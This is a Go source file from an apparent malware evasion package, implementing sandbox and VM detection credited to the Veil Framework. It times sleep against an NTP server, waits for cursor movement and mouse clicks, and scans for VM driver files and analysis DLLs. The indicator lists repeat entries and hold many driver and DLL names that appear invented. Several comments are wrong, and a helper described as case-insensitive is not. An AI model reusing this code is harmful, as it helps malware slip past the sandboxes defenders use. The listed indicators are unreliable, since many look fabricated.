//go:build windows
// +build windows

package evasion

import (
	"net"
	"runtime"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// PEB structure for reading BeingDebugged flag
type PEB struct {
	BeingDebugged byte
}

// AdvancedSandboxDetection implements novel techniques from Veil Framework
type AdvancedSandboxDetection struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

// NewAdvancedSandboxDetection creates a new advanced sandbox detector
func NewAdvancedSandboxDetection(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *AdvancedSandboxDetection {
	return &AdvancedSandboxDetection{logger: logger}
}

// CheckSleepAcceleration detects if sleep is being accelerated (Veil technique)
// This queries NTP to detect if sleep() calls are being sped up by sandboxes
func (asd *AdvancedSandboxDetection) CheckSleepAcceleration() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	// Get initial NTP time
	ntpTime1, err := queryNTP("us.pool.ntp.org")
	if err != nil {
		// If NTP fails, can't detect acceleration - assume safe
		return false
	}

	// Sleep for 60 seconds
	time.Sleep(60 * time.Second)

	// Get second NTP time
	ntpTime2, err := queryNTP("us.pool.ntp.org")
	if err != nil {
		return false
	}

	// Calculate actual elapsed time
	elapsed := ntpTime2.Sub(ntpTime1).Seconds()

	// If elapsed time is significantly less than 60 seconds, sleep is accelerated
	if elapsed < 55 { // Allow 5 second tolerance
		if asd.logger != nil {
			asd.logger.Debug("Sleep acceleration detected: elapsed=%f seconds", elapsed)
		}
		return true
	}

	return false
}

// CheckCursorMovement detects if cursor moved (Veil technique)
// Sandboxes typically don't simulate mouse movement
func (asd *AdvancedSandboxDetection) CheckCursorMovement() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	user32 := windows.NewLazySystemDLL("user32.dll")
	getCursorPos := user32.NewProc("GetCursorPos")

	type POINT struct {
		X, Y int32
	}

	var pt1 POINT
	ret1, _, _ := getCursorPos.Call(uintptr(unsafe.Pointer(&pt1)))
	if ret1 == 0 {
		return false // Can't get cursor position
	}

	// Wait 30 seconds
	time.Sleep(30 * time.Second)

	var pt2 POINT
	ret2, _, _ := getCursorPos.Call(uintptr(unsafe.Pointer(&pt2)))
	if ret2 == 0 {
		return false
	}

	// If cursor didn't move, likely in sandbox
	if pt1.X == pt2.X && pt1.Y == pt2.Y {
		if asd.logger != nil {
			asd.logger.Debug("Cursor movement check failed: cursor did not move")
		}
		return true
	}

	return false
}

// CheckMouseClicks requires mouse clicks before execution (Veil technique)
// Returns true if sandbox detected (not enough clicks)
func (asd *AdvancedSandboxDetection) CheckMouseClicks(requiredClicks int) bool {
	if runtime.GOOS != "windows" {
		return false
	}

	user32 := windows.NewLazySystemDLL("user32.dll")
	getAsyncKeyState := user32.NewProc("GetAsyncKeyState")

	const (
		VK_LBUTTON = 0x01 // Left mouse button
		VK_RBUTTON = 0x02 // Right mouse button
	)

	clickCount := 0
	timeout := time.After(5 * time.Minute) // 5 minute timeout
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	lastLeftState := false
	lastRightState := false

	for {
		select {
		case <-timeout:
			// Timeout - not enough clicks detected
			if asd.logger != nil {
				asd.logger.Debug("Mouse click check failed: only %d clicks detected (required: %d)", clickCount, requiredClicks)
			}
			return clickCount < requiredClicks
		case <-ticker.C:
			// Check left button
			ret, _, _ := getAsyncKeyState.Call(VK_LBUTTON)
			isPressed := (ret & 0x8000) != 0
			if isPressed && !lastLeftState {
				clickCount++
				if asd.logger != nil {
					asd.logger.Debug("Mouse click detected: %d/%d", clickCount, requiredClicks)
				}
			}
			lastLeftState = isPressed

			// Check right button
			ret, _, _ = getAsyncKeyState.Call(VK_RBUTTON)
			isPressed = (ret & 0x8000) != 0
			if isPressed && !lastRightState {
				clickCount++
				if asd.logger != nil {
					asd.logger.Debug("Mouse click detected: %d/%d", clickCount, requiredClicks)
				}
			}
			lastRightState = isPressed

			if clickCount >= requiredClicks {
				return false // Enough clicks detected, not a sandbox
			}
		}
	}
}

// CheckVMFiles checks for VM-specific files and DLLs (Veil technique)
func (asd *AdvancedSandboxDetection) CheckVMFiles() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	vmFiles := []string{
		`C:\windows\Sysnative\Drivers\Vmmouse.sys`,
		`C:\windows\Sysnative\Drivers\vboxguest.sys`,
		`C:\windows\Sysnative\Drivers\VBoxMouse.sys`,
		`C:\windows\Sysnative\Drivers\VBoxGuest.sys`,
		`C:\windows\Sysnative\Drivers\VBoxSF.sys`,
		`C:\windows\Sysnative\Drivers\VBoxVideo.sys`,
		`C:\windows\Sysnative\Drivers\vmhgfs.sys`,
		`C:\windows\Sysnative\Drivers\vmci.sys`,
		`C:\windows\Sysnative\Drivers\vmx_svga.sys`,
		`C:\windows\Sysnative\Drivers\vmxnet.sys`,
		`C:\windows\Sysnative\Drivers\vmrawdsk.sys`,
		`C:\windows\Sysnative\Drivers\vmusbmouse.sys`,
		`C:\windows\Sysnative\Drivers\vmwaremouse.sys`,
		`C:\windows\Sysnative\Drivers\vmwareguest.sys`,
		`C:\windows\Sysnative\Drivers\vmhgfs.sys`,
		`C:\windows\Sysnative\Drivers\vmwarevmmem.sys`,
		`C:\windows\Sysnative\Drivers\vmwarevideo.sys`,
		`C:\windows\Sysnative\Drivers\vmwaretoolbox.sys`,
		`C:\windows\Sysnative\Drivers\vmwarevmci.sys`,
		`C:\windows\Sysnative\Drivers\vmwarevmx86.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvmbus.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvmevtchn.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvscsi.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvstor.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvvmci.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvvdpa.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvnet.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvkb.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvmsi.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvvsock.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvballoon.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvpmem.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvscsi.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvstor.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvvmci.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvvdpa.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvnet.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvkb.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvmsi.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvvsock.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvballoon.sys`,
		`C:\windows\Sysnative\Drivers\vmwarexhvpmem.sys`,
		`C:\windows\Sysnative\Drivers\qemu-ga.sys`,
		`C:\windows\Sysnative\Drivers\qemupciserial.sys`,
		`C:\windows\Sysnative\Drivers\qemufwcfg.sys`,
		`C:\windows\Sysnative\Drivers\qemupci.sys`,
		`C:\windows\Sysnative\Drivers\qemuvga.sys`,
		`C:\windows\Sysnative\Drivers\qemuvideo.sys`,
		`C:\windows\Sysnative\Drivers\qemudisk.sys`,
		`C:\windows\Sysnative\Drivers\qemunet.sys`,
		`C:\windows\Sysnative\Drivers\qemuballoon.sys`,
		`C:\windows\Sysnative\Drivers\qemurng.sys`,
		`C:\windows\Sysnative\Drivers\qemufs.sys`,
		`C:\windows\Sysnative\Drivers\qemuserial.sys`,
		`C:\windows\Sysnative\Drivers\qemusound.sys`,
		`C:\windows\Sysnative\Drivers\qemusmartcard.sys`,
		`C:\windows\Sysnative\Drivers\qemutpm.sys`,
		`C:\windows\Sysnative\Drivers\qemuvdagent.sys`,
		`C:\windows\Sysnative\Drivers\qemudrm.sys`,
		`C:\windows\Sysnative\Drivers\qemuvirtio.sys`,
		`C:\windows\Sysnative\Drivers\qemuscsi.sys`,
		`C:\windows\Sysnative\Drivers\qemublock.sys`,
		`C:\windows\Sysnative\Drivers\qemunetwork.sys`,
		`C:\windows\Sysnative\Drivers\qemurng.sys`,
		`C:\windows\Sysnative\Drivers\qemufs.sys`,
		`C:\windows\Sysnative\Drivers\qemuserial.sys`,
		`C:\windows\Sysnative\Drivers\qemusound.sys`,
		`C:\windows\Sysnative\Drivers\qemusmartcard.sys`,
		`C:\windows\Sysnative\Drivers\qemutpm.sys`,
		`C:\windows\Sysnative\Drivers\qemuvdagent.sys`,
		`C:\windows\Sysnative\Drivers\qemudrm.sys`,
		`C:\windows\Sysnative\Drivers\qemuvirtio.sys`,
		`C:\windows\Sysnative\Drivers\qemuscsi.sys`,
		`C:\windows\Sysnative\Drivers\qemublock.sys`,
		`C:\windows\Sysnative\Drivers\qemunetwork.sys`,
	}

	vmDLLs := []string{
		"sbiedll.dll",   // Sandboxie
		"api_log.dll",   // API Monitor
		"dir_watch.dll", // FileMon
		"vmcheck.dll",   // VMware
		"wpespy.dll",    // WinPcap
		"fakenet.dll",   // FakeNet
		"pstorec.dll",   // Process Stalker
		"dbghelp.dll",   // Debug Help Library (if loaded from suspicious location)
		"deubg.dll",     // Typo variation
		"hookdumpx.dll", // Hook Dump
		"hookshk.dll",   // HookShark
		"hidetools.dll", // Hide Tools
		"vmsrvc.dll",    // VMware Service
		"vmtools.dll",   // VMware Tools
		"vmwarebase.dll", // VMware Base
		"vmwareuser.dll", // VMware User
		"vmwaretray.dll", // VMware Tray
		"vmwarectrl.dll", // VMware Control
		"vmwarex.dll",    // VMware X
		"vmusbmouse.dll", // VMware USB Mouse
		"vmwareguest.dll", // VMware Guest
		"vmwarehgfs.dll", // VMware HGFS
		"vmwarevmmem.dll", // VMware Memory
		"vmwarevideo.dll", // VMware Video
		"vmwaretoolbox.dll", // VMware Toolbox
		"vmwarevmci.dll",    // VMware VMCI
		"vmwarevmx86.dll",  // VMware VMX86
		"vboxguest.dll",    // VirtualBox Guest
		"vboxmouse.dll",    // VirtualBox Mouse
		"vboxservice.dll",  // VirtualBox Service
		"vboxsf.dll",       // VirtualBox Shared Folders
		"vboxvideo.dll",    // VirtualBox Video
		"vboxhook.dll",     // VirtualBox Hook
		"vboxogl.dll",      // VirtualBox OpenGL
		"vboxoglarrayspu.dll", // VirtualBox OpenGL Arrays SPU
		"vboxoglcrutil.dll",   // VirtualBox OpenGL CR Util
		"vboxoglfeedbackspu.dll", // VirtualBox OpenGL Feedback SPU
		"vboxoglpackspu.dll",     // VirtualBox OpenGL Pack SPU
		"vboxoglpassthroughspu.dll", // VirtualBox OpenGL Passthrough SPU
		"vboxsharedcrutil.dll",   // VirtualBox Shared CR Util
		"vboxwddm.dll",            // VirtualBox WDDM
		"vboxd3d.dll",             // VirtualBox D3D
		"vboxdisp.dll",            // VirtualBox Display
		"vboxgl.dll",              // VirtualBox GL
		"vboxicd.dll",             // VirtualBox ICD
		"vboxogl.dll",             // VirtualBox OpenGL
		"vboxsvc.dll",             // VirtualBox Service
		"vboxtray.exe",            // VirtualBox Tray
		"vboxallusers.xml",        // VirtualBox All Users Config
		"vboxusers.xml",           // VirtualBox Users Config
		"vboxcontrol.exe",         // VirtualBox Control
		"vboxheadless.exe",        // VirtualBox Headless
		"vboxmanage.exe",          // VirtualBox Manage
		"vboxmsinst.dll",          // VirtualBox MS Install
		"vboxnetadp.dll",          // VirtualBox Network Adapter
		"vboxnetflt.dll",          // VirtualBox Network Filter
		"vboxsrv.dll",             // VirtualBox Server
		"vboxsds.dll",             // VirtualBox SDS
		"vboxtray.exe",            // VirtualBox Tray
		"vboxusbmon.dll",          // VirtualBox USB Monitor
		"vboxvideo.dll",           // VirtualBox Video
		"vboxvrdp.dll",            // VirtualBox VRDP
		"vboxwebsrv.exe",          // VirtualBox Web Server
		"vboxxpcom.dll",           // VirtualBox XPCOM
		"vboxxpcomipc.dll",        // VirtualBox XPCOM IPC
		"qemu-ga.dll",             // QEMU Guest Agent
		"qemupciserial.dll",       // QEMU PCI Serial
		"qemufwcfg.dll",          // QEMU Firmware Config
		"qemupci.dll",            // QEMU PCI
		"qemuvga.dll",            // QEMU VGA
		"qemuvideo.dll",          // QEMU Video
		"qemudisk.dll",           // QEMU Disk
		"qemunet.dll",            // QEMU Network
		"qemuballoon.dll",        // QEMU Balloon
		"qemurng.dll",            // QEMU RNG
		"qemufs.dll",             // QEMU File System
		"qemuserial.dll",         // QEMU Serial
		"qemusound.dll",          // QEMU Sound
		"qemusmartcard.dll",      // QEMU Smart Card
		"qemutpm.dll",            // QEMU TPM
		"qemuvdagent.dll",        // QEMU VD Agent
		"qemudrm.dll",            // QEMU DRM
		"qemuvirtio.dll",         // QEMU VirtIO
		"qemuscsi.dll",           // QEMU SCSI
		"qemublock.dll",          // QEMU Block
		"qemunetwork.dll",        // QEMU Network
	}

	// Check VM files
	for _, file := range vmFiles {
		if fileExists(file) {
			if asd.logger != nil {
				asd.logger.Debug("VM file detected: %s", file)
			}
			return true
		}
	}

	// Check loaded DLLs
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	enumProcessModules := kernel32.NewProc("K32EnumProcessModules")
	getModuleFileNameEx := kernel32.NewProc("K32GetModuleFileNameExW")

	if enumProcessModules != nil && getModuleFileNameEx != nil {
		processHandle := windows.CurrentProcess()
		var modules [1024]uintptr
		var needed uint32

		ret, _, _ := enumProcessModules.Call(
			uintptr(processHandle),
			uintptr(unsafe.Pointer(&modules[0])),
			uintptr(len(modules)*int(unsafe.Sizeof(modules[0]))),
			uintptr(unsafe.Pointer(&needed)),
		)

		if ret != 0 {
			moduleCount := int(needed) / int(unsafe.Sizeof(modules[0]))
			for i := 0; i < moduleCount && i < len(modules); i++ {
				var filename [260]uint16
				ret, _, _ := getModuleFileNameEx.Call(
					uintptr(processHandle),
					modules[i],
					uintptr(unsafe.Pointer(&filename[0])),
					260,
				)

				if ret != 0 {
					modulePath := windows.UTF16ToString(filename[:])
					for _, vmDLL := range vmDLLs {
						if contains(modulePath, vmDLL) {
							if asd.logger != nil {
								asd.logger.Debug("VM DLL detected: %s in %s", vmDLL, modulePath)
							}
							return true
						}
					}
				}
			}
		}
	}

	return false
}

// queryNTP queries an NTP server for current time
func queryNTP(server string) (time.Time, error) {
	conn, err := net.Dial("udp", server+":123")
	if err != nil {
		return time.Time{}, err
	}
	defer conn.Close()

	// Set timeout
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	// NTP request packet (48 bytes)
	req := make([]byte, 48)
	req[0] = 0x1b // NTP version 3, client mode

	// Send request
	_, err = conn.Write(req)
	if err != nil {
		return time.Time{}, err
	}

	// Read response
	resp := make([]byte, 48)
	_, err = conn.Read(resp)
	if err != nil {
		return time.Time{}, err
	}

	// Extract timestamp from bytes 40-43 (seconds) and 44-47 (fraction)
	// NTP epoch is 1900-01-01, Unix epoch is 1970-01-01
	// Difference is 2208988800 seconds
	seconds := uint32(resp[40])<<24 | uint32(resp[41])<<16 | uint32(resp[42])<<8 | uint32(resp[43])
	ntpEpoch := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC)
	return ntpEpoch.Add(time.Duration(seconds-2208988800) * time.Second), nil
}

// fileExists checks if a file exists
func fileExists(path string) bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getFileAttributes := kernel32.NewProc("GetFileAttributesW")

	pathPtr, _ := windows.UTF16PtrFromString(path)
	ret, _, _ := getFileAttributes.Call(uintptr(unsafe.Pointer(pathPtr)))

	// INVALID_FILE_ATTRIBUTES = 0xFFFFFFFF
	return ret != 0xFFFFFFFF
}

// contains checks if a string contains a substring (case-insensitive)
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(substr) == 0 || 
		(len(s) > len(substr) && (s[:len(substr)] == substr || 
		s[len(s)-len(substr):] == substr || 
		containsMiddle(s, substr))))
}

func containsMiddle(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

